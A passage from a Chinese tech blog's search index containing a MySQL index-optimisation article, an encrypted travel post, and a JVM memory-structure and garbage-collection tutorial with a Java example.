查询也是会使用索引的，前提是 select 数据列都加了索引。 哪些字段应该创建索引 增删改非常频繁的字段不适合作为索引 查询中与其他表关联的字段，例如外键应该建立索引 WHERE 和 JOIN 子句中，较频繁作为查询条件的字段应该创建索引 查询中排序（order by）、分组（group by）、统计的字段应该建立索引 唯一性太差的字段不适合创建索引，尽管频繁作为查询条件，例如：性别字段 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 索引使用注意事项 针对普通查询 避免使用 select * 连表时注意条件类型需一致 创建表时尽量时 char 代替 varchar &nbsp;count (1) 或 count (列) 代替&nbsp;count (*) 使用表连接（JOIN）来代替子查询（Sub-Queries） 针对索引使用 使用组合索引代替多个单列索引（经常使用多个条件查询时） 索引散列值（重复多的值）不适合建索引，例如：性别字段不适合建索引 索引不会包含有 NULL 值的列，只要列中包含有 NULL 值都将不会被包含在索引中，组合索引中只要有一列含有 NULL 值，那么这一列对于此组合索引就是无效的，因此在数据库设计时不要让字段的默认值为 NULL 不要在列上进行运算，例如 select * from users where YEAR(adddate)&lt;2007，将在每个行记录上进行运算，这将导致索引失效而进行全表扫描，因此可以改成 select * from users where adddate&lt;’2007-01-01′ 尽量使用短索引，对串列进行索引，如果可能应该指定一个前缀长度。例如：如果有一个 CHAR (255) 的列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引；短索引不仅可以提高查询速度，还可以节省磁盘空间和 I/O 操作 MySQL 5.0 之前，SQL 查询只能使用一个索引，因此如果 WHERE 子句中已经使用了索引的话，那么 order by、group by 中的列是不会使用索引的。因此如果数据库默认排序可以符合要求的情况下，不要使用排序操作，同时尽量使用不包含多个列的排序，如果需要最好给这些列创建组合索引 查看索引的使用效果执行计划Explain + 查询 SQL，用于显示 SQL 执行信息参数，根据参考信息可以进行 SQL 优化或者判断索引是否生效 查看索引的使用情况1show status like \'%Handler_read%\'; handler_read_key：这个值越高越好，越高表示使用索引查询到的次数越多 handler_read_rnd_next：这个值越高，说明查询效率低效 补充说明MySQL 查询只能使用一个索引？MySQL 5.0 之前，SQL 查询只能使用一个索引，所以要合理使用组合索引，而不是单列索引。与其说是 “数据库查询只能用到一个索引”，倒不如说和全表扫描、只使用一个索引的查询速度比起来，去分析多个索引二叉树更加耗费时间，所以绝大多数情况下数据库都是用一个索引。特别注意：从 MySQL 5.1 开始，引入了索引合并优化技术，对同一个表可以使用多个索引分别进行条件扫描。 1select count(1) from table1 where column1 = 1 and column2 = \'foo\' and column3 = \'bar\'; 例如上面的语句，当数据库有 N 个索引并且查询中分别都要用上它们的情况下：查询优化器（用于生成执行计划）需要进行 N 次主二叉树查找（这里主二叉树的意思是最外层的索引节点），此时的查找流程大概是：查出第一条 column1 主二叉树等于 1 的值，然后去第二条 column2 主二叉树查出 foo 的值并且当前行的 coumn1 必须等于 1，最后去 column3 主二叉树查找 bar 的值并且 column1 必须等于 1 和 column2 必须等于 foo。如果这样的流程被查询优化器执行一遍，就算不死也半条命了，查询优化器可等不及把以上计划都执行一遍，贪婪算法（最近邻居算法）可不允许这种情况的发生。所以当遇到上面的语句，数据库只要用到第一个筛选列的索引（column1），就会直接去进行表扫描了。所以与其说是数据库只支持一条查询语句只使用一个索引，倒不如说 N 个独立索引同时在一条语句使用的开销比只使用一个索引还要大。最佳推荐是使用 index(column1, column2, column3） 这种组合索引，此组合索引可以把 B+Tree 结构的优势发挥得淋漓尽致。一条主二叉树（column=1），查询到（column=1）节点后基于当前节点进行二级二叉树（column2=foo）的查询，在二级二叉树查询到（column2=foo）后，去三级二叉树（column3=bar）查找，这样查询效率会高跟多。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"数据库"},{title:"海珠区江南西路游玩攻略",url:"/posts/c7942874.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff0779ed4b5f8e44b38cb5cd33ddb3f5e17d738ccb05f48b4402c7881c3e63234c8feab92be78f929c4380d2531414e4729185acc02e933bc3c0af637267fa0250c33a22ad3ac3073bd799fabe2cff5637f8866619450f1942597d62754d0c5bfb17b193a5f2a307dd6372a1b4a5767d5dfa7807263461a6445a04c26f38b7d2d0bfe5c09001d6797fc7301172ca92e49825a0abed29a62aec5940ca20d0e8ba726d4160c64aec06bfd21d0c957c181cc5df0ec501aee6486e3a5f922b313134a0f39d95e1a718958277c437578a2008bc56a80f28a32a94318799fa60299e88af8dfaacd2dd0b14861e50ffa61f2299fd448181f47668122d0286a58569160e3ad0a83cc3616a688a66b9ec18af7e9d116dde6c21f14c6b0052a03f3d959e777d06ae6b142a844a3024b1dafafcc585ba005be9cf40c9e1409d6edf2b07dbfb64e120e5049bc3d3e99535cb211356f4be0e74058e8cbe919565d6eb80c445f839f4f2f0d2dc00f4456a2d0edf524d0aff7b16622a6bc6f7e49d63065cdc04791679b796d7dab30d3acd4a19f06425825c52065b670757e1877f4cb4145b9321dc945d04de2ff139bf1942dbce38e761d9ff3fb19614ce249fa132c8c42ec6f2f522625d274576ae1e4bc137182bb12da631c8097880875d5911282b947fd00a8382b40570e060dbe686ddfc1033754aec6466abbf4a5424ce6830292ac52217187a3abaa52870aa9476502f931721c9d7f507e2e2c146b600958408204737cce7e062fa0e9739e6abf2a11ce5c8ef1960fdffb064fc225f2a0c563ffd9b2c8c5e451e1fcb957a3412c6d0b002c356dee70b13656bad862040019d19a15ccb60ab0d405818fe96a19d3ee9094bb677e1d1113b0d6643d0c479a5a959c01b9ebbd6a12c8b2ef0fe2e75a5503a2cb305f64a25194cb96b91c5dab093355573a705043e4d4cc00c9fd7d85271c88ec8d2e4d8536f35a0c1d51a6204a8b7c5114fec57c63bdc7650ca12fb866fe32466639027e0ec09fd0d2ffeaedac64cda547c0614194dbb2b7a9c3dbdc36d74548a5121db7d16f17860c3e7fad6fb711e371940deab7b6fc39434330264843ecd76da88030dc81f429ad0bdeba0e298746035f94abeb19c22a4996c2aae3071ddf36bb50a0f5fdceb674c286088b5404fd62b00ef2e0e3131b0f2d70f478114996b0912e9fa82a2f4bd6733cbd51913a1fc79f81b0ba9482f7952b6a235f7c1f0648253952d3db05ea08ff5f7f43bf939b1b0166f349164ef1542e6d3b924b5ffd50469271de0067b705179f41c925af10b947d293def32cbe3bcb44e289a46a5300be199a7abbb76865403321531901d5a686341e3a02b0410e2698af0ac012e25ac7c384091554a7445ebe02d0652d9d6d328b02640c03a042bf28947f0e06f14906390a038ba0d9117ea887f7d4b035147795f0d3edfdcaaba7c40e023a517ab4c6466a973c2f5ccd1a6a6f27a9a5472bd6e6fd678dd3be27068de5397b6d57f180147a9bf5bd80fcaebcb4d20b6fccd3f6112886834828711808734e2dcb8145d6e03ea2b449c736b7181a47936d22341339fac2cbe343b38a9bb6b3a372e5c0d34c35e595e0f902d621ee0d4142616f293549232512f83a3b47c82985b3d6f0d07283a18e44663aa16fa79dc27c033de0d64305e229032970044c18c58791c29d5e1fc62c546f949ea7586b467ab0be781e7d59734009773e420b3b266cd339f84d689f826d8f55ac2b37bdaced95fb9cf8dd5cb125f8772120c790135c0bbba03cc775a21799be0146b4c696880a53edd80d68716a757fcfe8c29e3cc08a2628c341162ea152a7c512988f74817e6d349e554a6c7bcacbc6ab349a500468029544087d334d181560b5a5d0ee35ef44bc77ed92968fe6ab5b3a06a079e128a8ec3ab439bad9999e52909f0b9263bab7c195071a3fe97f5f19623986ec1373c8c61842699a26257a0e4b081a08424e8f047888ac113baa9930191988c564edf0f5e8bed2a461a51db4271a759b9ac3e91a0d84137dd6fab99f6b444cc2854e392c15f56344a7ef0d7812818d145b1f76fe79a30f0d25512b5875d0cce0ad6b3fa15e4f187789c68650c14ab5408f4b41045db4f04d45293f207dca3b136a3905722b363521c0d7e7fc982b55b8f35eb10c1a831148f59e75c137a11bbabc12bc8b1e5958070870e1934c4948e8c04f95bedd0b126c566b5437149e7a5fedf9b1ccd2fbf7ca66ee2d372209b106bb1067efbd981f728744958696d16a4f6ad9f006aabe44bf831724937192fe9def71181d5b3bb085543a894042b2fea20e89e831bc235db2f39c7fb6747fed074d1d4b74397e0e139c93af7be3251c4a90d4c52571240728188257d76ed7e19555f81a61846986b31bd4395a31c5bdd94b8f138d3ff22d1827f1c85ffe75eaee547fe5c90b70ded5fc14213846a21a908f77065408bbe9f54f4635bd724f65b9e7694eb08bbb5e0d20b41276f4e16b2ad809e7586299fb4fe0934bc41e64c8dd92526e90d8ddad9ee7f8b28a0a99a6eb3c9e4259245068a46eab7f9e223b9af856f9a011b1f8c76dab3f72d4f1b035cf9b2ca81280f4b5c9802a096b90b37d8a865e8a9e0ac437a1b995483ba565c711f68eeec2f0ace40b511889a41b7dbd16ae49ca08f4f5c5f6e0c8806356e50e4656f64da94af217db7b526d894fb6873b4578dedf84f04315646c118a8320f87c3af04f56091e12d2501700d94246f12654355c3a12a2822f2d442890653780b80f16959d04dea553648f33fd52ab0d709ca56b9fe3297fe75209559883347d9ed4e91679827943c66e4f95cd7114e344cd1a50ce83dd744682362a725e2f13aac0fa51e5afc02352399d79d22a1b4edcbd2a5aa8054771ac0feba3508490cc380cd2534681327fb7ff00a06f43bc02e98e83168f315162ed82af569e6098bce540d28a3c282aa25d1a58c73cf879c030ba2c59b4ccfbd8af5f880fa25f5e5623702c51952d0c96348524c9239249212a5c79e8d4beb90b9c1a64410a756d3cf50d8e28069be0534a57ae1a9a93ba4394feee0ff5752d79a88e3c41aff8ca2851a9ee8916a37224312da82afb2e4971bd14d01327cc730cc877a6039ed56d22a1f233fae43cfd54aa65abbeb01f5bfaa2c39c7d9b8e35c7a43f7ea306dc521a50deed420e5527b406d4477fd6169a9cb256f48433acbdb1fffa98b734a137058eb82e882aa5a3ce73554019bc8b6ac6ce69ca85afeb5df87277d85ebfd123c439f92923816448703e01bde018d65811bdace3db3ac8664e66f3a878eb72e27aebc2244c519ddac3ff0d01778a1019c572ca35edf7449dbdfff0c2876cfee20d838a66d521f418602175a563c10cb190b926415d4067e2e4770eb5ef24e49637ccad4bb99820fa194cad240781f30d7461bdf9baea898a45a67dc0a69a0c2287d0350d8c424e41178eac4349f3dd5feb157ae6582f6fbcd8d5cf1a528b9d31542d0e5258c50704d0a0c88e72286525f8f99ca91735b9877a586e95ac84ba497ef3d34fc4db22e35b48d594cf9428af95dc42fbfce51cd1483129e33a4125d4d2ef48c733d918558cb2afa05319cd62e0444a20550623c43cf39d7c48c6e1a82b210dfbb6d2153a626c180d4c3a42d785735938a668a3f4e048909c59c290bc247bf31f2ed7b4ad6436289ee3c236e0922da9672a772bd7ae3c41fabde7aa51cf03638dabb699609b826a4399558de217af5bd4379940ad44162cd136c2369a844d0797f48889966b8caab8b8316c28009dad7ea29f7890948b28115bac2a7901995e30ae0aaf2006db956af37bc6107e3128382dae635119cd8a3dfce5de4f889d59e27b41bfb099e5c36bd328015adbe85082cacea54e640907e8c4ddec45d53f68b8341a533fb994b9d8c73b537150193af675bf9a6a307e4fdc1ed771d927e681d85a542a85dfde25d994d52d4c67b2ff735100ac531cb53487ff01c9e771c4164dfbbbae663da4133561c8afcc86d5fa738ec7e0eba0fc21397b8d30c64f2997609efaa0837cfae61bc9e84e35b3e3599793bed5571ac3f0f2bd35ac9143a4f58a1383dacddee7305046360f830f9b0df3910f6e065e5722ef50ab4b413e254d29e348eb492d34852bbe3ea6f4471925510c4bc9bcfc4c1c50eb1732ed7b06bafc58388a6cc14da40167a1c7c48dbe59b6b0031324eb1f83a1ac3b22d66283e748e5711f2da38698334687931b27f837a789e75ebb1be2c07570a202a65bfd8026abea2e5779726c34c0f2fdf171c9eb6c2983f78b629744ed3da264d4622f5cb5347da09a45f64905014fce7789a2524ca58c4e377ed7fbd67e6f4514ea043f8d0455442848cf4400f8786bc23c756db670e8f041de069e929b4d496b5d68eaf776d81e1137d59ff3d01f1de36ea9fb25ebeeca44124854db0b2e8c91e0190bb33250bf7f361644096cee48a310d3517e5ca0f972d4a7e64ff5e623ad6c944174f1159be4b9288256198c0a4719c6b483bb7bfff63dc9f6bcb553dc7a92cfab6324be0cd2ed5596e615b236c62c26cad1edc8bff952dbbaf1a44a90b2f4be9d29cbf86f59c8c709a7a48951b67a8ef52442f46e237366baf71203714d046bdc9f50e384f 请 输 入 阅 读 密 码.",tags:"加密博客 游玩攻略"},{title:"JVM 内存结构与 GC 算法",url:"/posts/2f77f23a.html",text:'Java 虚拟机JVM 内存结构JVM 内存结构主要有三大块：栈、堆内存、方法区。堆内存是 JVM 中最大的一块，由新生代和老年代组成，不包括永久代（方法区）；而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间，默认情况下新生代按照 8:1:1 的比例来分配。方法区存储类信息、静态变量、常量、常量池等数据，是线程共享的区域，为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。栈又分为 Java 虚拟机栈和本地方法栈，主要用于方法的执行。 堆内存堆内存（Heap）是 Java 虚拟机所管理内存最大的一块，各个线程之间共享，在虚拟机启动时创建，此区域的唯一目的就是存放实例对象，几乎所有的实例对象都在这里分配内存。堆内存是垃圾收集器（GC）管理的主要区域，因此很多时候被称为 “GC 堆”。由于现在垃圾收集器基本采用分代收集算法，所以堆内存还可以被分为新生代和老年代，而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间。Java 虚拟机规范的规定，堆内存可以在物理不连续的内存空间上，只要逻辑上是连续的即可。如果在堆内存中没有足够的内存完成实例分配，并且堆内存也无法再扩展时，将会抛出 OutOfMemoryError 异常。 方法区方法区（Method Area）包含了类信息、静态变量、常量、常量池，是各个线程共享的内存区域。它存储已被虚拟机加载的类信息、静态变量、常量、常量池，即编译器编译后的代码等数据。为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。对于习惯在 HotSpot 虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为” 永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为 HotSpot 虚拟机的设计团队选择把 GC 分代收集扩展至方法区，或者说使用永久代来实现方法区而已。相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入了方法区就如永久代的名字一样” 永久” 存在了。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收 “成绩” 比较难以令人满意，尤其是类型的卸载，条件相当苛刻，但是这部分区域的回收确实是有必要的。当方法区无法满足内存分配需求时，将抛出 OutOfMemoryError 异常。方法区中的常量和静态变量引用的对象，可作为 GC Root。 Java 虚拟机栈Java 虚拟机栈（Java Virtual Machine Stacks），是线程私有的，生命周期和线程相同。每个方法执行的同时，会创建一个栈帧（Stacks Frame）用于存储局部变量表、操作数栈、动态链接、方法出口等信息。方法的执行，对应栈帧在虚拟机中入栈到出栈的过程（一句话总结：创建栈帧执行方法，程序计数器会指向栈顶）。局部变量表存放了编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、double、long）、对象引用（Reference 类型，它不等同于对象本身，根据不同的虚拟机实现，它可能是一个指向对象起始地址的引用指针，也可能指向一个代表对象的句柄或者其他与此对象相关的位置）和 ReturnAddress 类型（指向了一条字节码指令的地址）。其中 64 位长度的 long 和 double 类型的数据会占用 2 个局部变量空间（Slot），其余的数据类型只占用 1 个。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。在 Java 虚拟机规范中，对这个区域规定了两种异常状况：如果线程请求的栈深度大于虚拟机所允许的深度，将抛出 StackOverflowError 异常；如果虚拟机栈可以动态扩展（当前大部分的 Java 虚拟机都支持动态扩展，只不过 Java 虚拟机规范中也允许固定长度的虚拟机栈），当扩展时无法申请到足够的内存时会抛出 OutOfMemoryError 异常。Java 虚拟机栈引用的对象可作为 GC Root。 本地方法栈本地方法栈（Native Method Stack），与 Java 虚拟机栈发挥的作用相似，它们之间的区别不过是 Java 虚拟机栈为虚拟机执行 Java 方法（也就是字节码）服务，而本地方法栈则为虚拟机使用的 Native 方法服务。Java 虚拟机规范中对本地方法栈中的方法使用的语言、使用方式与数据结构并没有强制规定，因此具体的虚拟机可以自由实现它。甚至有的虚拟机（譬如 Sun HotSpot 虚拟机）直接就把本地方法栈和 Java 虚拟机栈合二为一。与 Java 虚拟机栈一样，本地方法栈区域也会抛出 StackOverflowError 和 OutOfMemoryError 异常。本地方法栈 Native 方法引用的对象可作为 GC Root。 程序计数器程序计数器（Program Counter Register）是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器，即保证线程切换后恢复到正确的执行位置。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。由于 Java 虚拟机的多线程是通过线程切换并获取时间片的方式来实现的，在任何一个确定的时刻，一个处理器（对于多核处理器来说是一个内核）只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间的计数器互不影响，独立存储，一般称这类内存区域为 “线程私有” 的内存。如果线程正在执行的是一个 Java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址。如果正在执行的是 Natvie 方法，这个计数器值则为空（Undefined）。此内存区域是唯一一个在 Java 虚拟机规范中没有规定任何 OutOfMemoryError 异常情况的区域。 运行时常量池运行时常量池（Runtime Constant Pool）是方法区的一部分，用于存放编译期生成的各种字面量和符号引用。这部分内容在类加载后进入方法区的运行时常量池存放。运行时常量池另一个重要特征就是具有动态性。Java 语言并不要求常量一定只有编译期才能产生，运行期间也可以将新的常量放入池中，这种特性被开发人员利用的比较多的就是 String 类的 intern() 方法。 直接内存直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是 Java 虚拟机规范中定义的内存区域，但是这部分内存也被频繁的使用，而且也可能导致 OutOfMemoryError 异常。在 JDK1.4 中新加入的 NIO 类，引入了一种基于通道（Channel）与缓存区（Buffer）的 I/O 方式。它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中提高性能，因为避免了 Java 堆和 Native 堆中来回复制数据。值得注意的是，本机的直接内存的分配不会受到 Java 堆大小的限制，但是会受到本机总内存的限制，这可能导致各个内存区域总和大于物理内存的限制，从而导致动态扩展时出现 OutOfMemoryError 异常。 通过参数来控制各区域的内存大小 -Xms，设置堆内存的最小空间大小 -Xmx，设置堆内存的最大空间大小 -XX:NewSize，设置新生代最小空间大小 -XX:MaxNewSize，设置新生代最大空间大小 -XX:PermSize，设置永久代（方法区）最小空间大小 -XX:MaxPermSize，设置永久代（方法区）最大空间大小 -Xss，设置每个线程的堆栈大小 特别注意：JVM 没有提供直接设置老年代的参数，但是可以设置堆空间大小和新生代空间大小来间接控制，老年代空间大小 = 堆空间大小 - 新生代大空间大小 JVM 垃圾收集机制如何确定一个对象是否会被回收引用计数算法（Reference Counting）引用计数算法是通过判断对象的引用数量来决定对象是否可以被回收。它的思路是给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加 1；当引用失效时，计数器值就减 1；任何时刻计数器为 0 的对象就是不可能再被使用的。大部分场景下，这个算法都是不错，效率也比较高；但是 Java 虚拟机里面没有选用引用计数算法来管理内存，其中最主要的原因是它很难解决对象之间相互循环引用的问题；而且对对象赋值时均要维护引用计数器，同时计数器本身也有一定的消耗。 123456789101112131415161718192021222324252627282930/** * 引用计数算法的缺陷 */public class ReferenceCountingGC { public Object instance = null; public static final int _1MB = 1024 * 1024; /** * 占点内存，以便GC日志观看 */ private byte[] bigSize = new byte[2 * _1MB]; public static void main(String[] args) { testGC(); } public static void testGC() { ReferenceCountingGC objA = new ReferenceCountingGC(); ReferenceCountingGC objB = new ReferenceCountingGC(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; //这里发生GC， objA 和 objB能否被回收？ System.gc(); }} 上述代码最后面两句将 objA 和 objB 赋值为 null，也就是说 objA 和 objB 指向的对象已经不可能再被访问，但是由于它们互相引用对方，导致它们的引用计数器都不为 0，那么垃圾收集器就永远不会回收它们。 可达性分析算法（Reachability Analysis）判断对象的引用链是否可达。它的思路是：通过一系列的称为 “GC Roots” 的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain），当一个对象到 GC Roots 没有任何引用链相连（用图论的话来说就是从 GC Roots 到这个对象不可达）时，则证明此对象是不可用的，如图所示： 在 Java 中，可作为 GC Root 的对象包括以下几种： 方法区中常量引用的对象 方法区中类静态属性引用的对象 Java 虚拟机栈（栈帧中的局部变量表）中引用的对象 本地方法栈中 JNI（即一般说的 Native 方法）引用的对象 GC 算法垃圾收集算法主要有：复制算法（Copying）、标记 - 清除算法（Mark-Sweep）、标记 - 整理算法（Mark-Compact）、分代收集算法（Generational Collection）。 标记 - 清除算法“标记 - 清除” 算法是最基础的算法，它分为 “标记” 和” 清除” 两个阶段：首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。它有两个不足：一个是效率问题，标记和清除两个过程的效率都不高（两次扫描，耗时严重）；另一个是空间问题，标记清除之后会产生大量的不连续的内存碎片，空间碎片太多可能会导致以后在程序运行过程中需要分配较大对象时，无法找到足够的连续内存从而不得不提前触发另一次垃圾收集动作。 复制算法 为了解决效率问题，一种称为 “复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这块的内存用完了，就将还存活着的对象复制到另一块上面，然后再把已使用过的内存空间一次清理掉。这样使得每次都是对整个半区进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。 将现有的内存空间分为两快，每次只使用其中一块，在垃圾收集时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾收集。如果系统中的垃圾对象很多，复制算法需要复制的存活对象数量并不会太大。因此在真正需要垃圾收集的时刻，复制算法的效率是很高的。又由于对象在垃圾收集过程中统一被复制到新的内存空间中，因此，可确保回收后的内存空间是没有碎片的。复制算法的高效性是建立在存活对象少、垃圾对象多的前提下的。这种情况在新生代经常发生，但是在老年代更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，由于存活的对象较多，复制的成本也将很高。该算法的缺点是将系统内存折半。 Java 虚拟机的新生代串行垃圾收集器中使用了复制算法的思想。新生代分为 Eden 空间、From Survivor 空间、To Survivor 空间。其中 From Survivor 空间和 To Survivor 空间可以视为用于复制的两块大小相同、地位相等，且可进行角色互换的空间块。From Survivor 和 To Survivor 空间也称为 Survivor 空间，即幸存者空间，用于存放未被回收的对象。在垃圾收集时，Eden 空间中的存活对象会被复制到未使用的 Survivor 空间中（假设是 To Survivor），正在使用的 Survivor 空间（假设是 From） 中的年轻对象也会被复制到 To Survivor 空间中 (大对象或者老年对象会直接进入老年代，如果 To Survivor 空间已满，则对象也会直接进入老年代)。此时，Eden 空间和 From Survivor 空间中的剩余对象就是垃圾对象，可以直接清空，To Survivor 空间则存放此次回收后的存活对象。这种改进的复制算法既保证了空间的连续性，又避免了大量的内存空间浪费。 标记 - 整理算法复制收集算法在对象存活率较高时就要进行较多的复制操作，效率将会变低。如果不想浪费 50% 的空间，就需要有额外的空间进行分配担保，以应对被使用的内存中所有对象都 100% 存活的极端情况，所以老年代不能直接选用这种算法。标记整理算法中，标记过程仍然与 “标记 - 清除” 算法一样，但是后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 分代收集算法对于一个大型的系统，当创建的对象和方法变量比较多时，堆内存中的对象也会比较多，如果逐一分析对象是否该回收，那么势必造成效率低下。分代收集算法是基于这样一个事实：不同的对象的生命周期（存活情况）是不一样的，而不同生命周期的对象位于堆内存中不同的区域，因此对堆内存不同区域采用不同的策略进行回收可以提高 JVM 的执行效率。“分代收集”（Generational Collection）算法，根据对象存活周期的不同将内存划分为几块。一般是把 Java 堆分为新生代和老年代，这样既可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用 “标记 - 清除” 或者 “标记 - 整理” 算法来进行回收。 GC 算法对比复制算法： 复制算法执行的速度较快，典型的空间换时间 当对象的存活率很高的时候，不断的复制操作会显得耗时 复制算法很明显的缺点就是浪费内存空间，因为将内存分为两块，一次只能使用一块，这也意味着分的块越大，浪费的内存越多 标记 - 清除算法： 首先是速度慢，因为” 标记 - 清除算法” 在标记阶段需要使用递归的方式从根结点出发，不断寻找可达的对象；而在清除阶段又需要遍历堆内存中的所有对象，查看其是否被标记，然后再清除；并且在程序进行 GC 的时候，JVM 中所有的 Java 程序都要进行暂停，俗称 Stop-The-World，后面会提到。 其次是其最大的缺点，使用这种算法进行清理而得的堆内存的空闲空间一般是不连续的，由于对象实例在堆内存中是随机存储的，所以在清理之后，会产生许多的内存碎片，如果这个时候来了一个很大的对象实例，尽管显示内存还足够，但是已经存不下这个大对象了，内存碎片太多会导致当程序需要为较大对象分配内存时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。再者，这种零散的碎片对于数组的分配也不是很方便。 标记 - 整理算法： 首先这种算法克服了” 标记 - 清除算法” 中会产生内存碎片的缺点，也解决了复制算法中内存减半使用的不足 而其缺点则是速度也不是很快，不仅要遍历标记所有可达结点，还要一个个整理可达存活对象的地址，所以导致其效率不是很高 关于 Stop-The-World在 GC 算法执行的时候，所有正在执行中的 Java 程序都会被挂起（被暂停），只有 Native 方法可以执行，但是也不能和 JVM 进行交互，这样一来似乎整个 Java 世界都停止了，这也就是为什么叫做 Stop-The-World；等到 GC 程序执行完毕后，Java 程序才会重新恢复执行。这个其实很好理解，因为 GC 程序是一个线程，Java 程序也是一个线程，它们操作的堆内存是一片共享的区域，假设一种情况，Java 程序 A 新建了一个对象 object，new Object（）被存放在堆内存，但是很不巧的是，堆内存刚刚执行过复制算法，前一步存活的对象已经被转移到另一块空间了，而 new Object（）就留在了原来的空间，无辜地被清除了。这显然是不可接受的，因为线程不安全。 内存分配策略Java 的自动内存管理，最终可以归结为自动化地解决了两个问题：给对象分配内存、回收分配给对象的内存。对象的内存分配通常是在堆上分配（除此以外还有可能经过 JIT 编译后被拆散为标量类型并间接地在栈上分配），对象主要分配在新生代的 Eden 空间上，如果启动了本地线程分配缓冲，将按线程优先在 TLAB 上分配。少数情况下也可能会直接分配在老年代中，分配的规则并不是固定的，实际取决于垃圾收集器的具体组合以及虚拟机中与内存相关的参数的设置。下面以使用 Serial/Serial Old 收集器，介绍内存分配的策略。 对象优先在 Eden 空间分配大多数情况下，对象在新生代的 Eden 空间中分配，当 Eden 空间没有足够空间进行分配时，虚拟机将发起一次 Minor GC。 大对象直接进入老年代所谓的大对象是指需要大量连续内存空间的 Java 对象，最典型的大对象就是很长的字符串以及数组。大对象对虚拟机的内存分配来说是一个坏消息（尤其是遇到朝生夕灭的 “短命大对象”，写程序时应避免），经常出现大对象容易导致内存还有不少空间时，就提前触发 GC 以获取足够的连续内存空间来安置它们。虚拟机提供了一个 -XX:PretenureSizeThreshold 参数，令大小超过这个设置值的对象直接在老年代分配。这样做的目的是避免在 Eden 空间及两个 Survivor 空间之间发生大量的内存复制（新生代采用复制算法来回收内存）。 长期存活的对象将进入老年代既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这点，虚拟机给每个对象定义了一个对象年龄（Age）计数器。如果对象在 Eden 空间出生并经过第一次 Minor GC 后仍然存活，并且能被 Survivor 空间容纳的话，将被移动到 Survivor 空间中，并且对象年龄设为 1。对象在 Survivor 空间中每 “熬过” 一次 Minor GC，年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁），就将会被晋升到老年代中。对象晋升老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 设置。 动态对象年龄判定为了能更好地适应不同程序的内存状况，虚拟机并不是永远地要求对象的年龄必须达到了 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 空间中相同年龄所有对象大小的总和大于 Survivor 空间的一半，年龄大于或等于该年龄的对象就可以直接进入老年代，无须等到 MaxTenuringThreshold 中要求的年龄。 空间分配担保在发生 Minor GC 